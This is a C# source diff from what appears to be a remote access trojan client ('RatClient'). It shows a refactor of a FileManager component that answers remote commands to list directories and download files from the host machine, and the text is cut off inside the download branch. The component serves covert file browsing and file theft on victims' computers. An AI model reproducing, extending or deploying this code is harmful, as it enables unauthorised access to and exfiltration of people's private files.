@@ -8,11 +8,11 @@ namespace RatClient.Features
     public class FileManager
     {
         #region Variables
-        private Action<object> SendJson;
+        private Action<dynamic> SendJson;
         #endregion
 
         #region Constructor
-        public FileManager(Action<object> SendJson)
+        public FileManager(Action<dynamic> SendJson)
         {
             this.SendJson = SendJson;
 
@@ -21,19 +21,19 @@ namespace RatClient.Features
         #endregion
 
         #region Methods
-        private void HandleMessage(dynamic jsonMessage)
+        private void HandleMessage(dynamic message)
         {
-            if (jsonMessage["type"] == "fm_list")
+            if (message["type"] == "fm_list")
             {
-                string filesAndFolders = GetFilesAndFolders(jsonMessage["path"]);
+                string filesAndFolders = GetFilesAndFolders(message["path"]);
                 if (!string.IsNullOrEmpty(filesAndFolders))
                 {
                     SendJson(new { type = "fm_list", filesAndFolders });
                 }
             }
-            else if (jsonMessage["type"] == "fm_download")
+            else if (message["type"] == "fm_download")
             {
-                string filePath = jsonMessage["path"];
+                string filePath = message["path"];
 
                 if (File.Exists(filePath))
                 {
